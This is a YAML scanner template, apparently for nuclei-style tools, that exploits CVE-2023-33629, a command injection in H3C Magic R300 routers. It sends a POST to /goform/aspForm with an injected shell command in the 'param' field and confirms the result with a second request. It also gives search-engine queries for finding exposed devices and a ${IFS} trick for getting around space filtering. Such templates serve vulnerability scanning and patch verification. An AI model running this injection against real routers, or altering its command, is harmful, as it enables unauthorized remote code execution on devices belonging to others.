id: CVE-2023-33629

info:
  name: H3C Magic R300-2100M RCE
  author: zan8in
  severity: critical
  description: |
    H3C Magic R300是中国新华三（H3C）公司的一款无线路由器。H3C Magic R300版本R300-2100MV100R004中包含的堆栈溢出漏洞。该漏洞通过DeltriggerList接口在/goform/aspForm处发生。
    FOFA: app="H3C-Ent-Router"
    HUNTER: app.name="H3C Router Management"
    $(ls>/www/test) 执行命令不能存在空格，使用${IFS}绕过空格执行命令。
  reference:
    - https://mp.weixin.qq.com/s/c8FeLqNLv6kP0B0qy7Nx2Q
    - https://mp.weixin.qq.com/s/sWQdB39akVlFHDepZO2mrA
  tags: H3C-Ent-Router
flow: |
  http("r0") && http("r1")

variables:
  randstr: rand_base(6)

http:
  - id: "r0"
    raw:
      - |
        POST /goform/aspForm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/{{randstr}});

    matchers:
      - type: dsl
        internal: true
        dsl:
          - contains(body,"do_cmd.asp")
        condition: and

  - id: "r1"
    raw:
      - |
        GET /{{randstr}} HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"www") && contains(body,"www_multi")
        condition: and

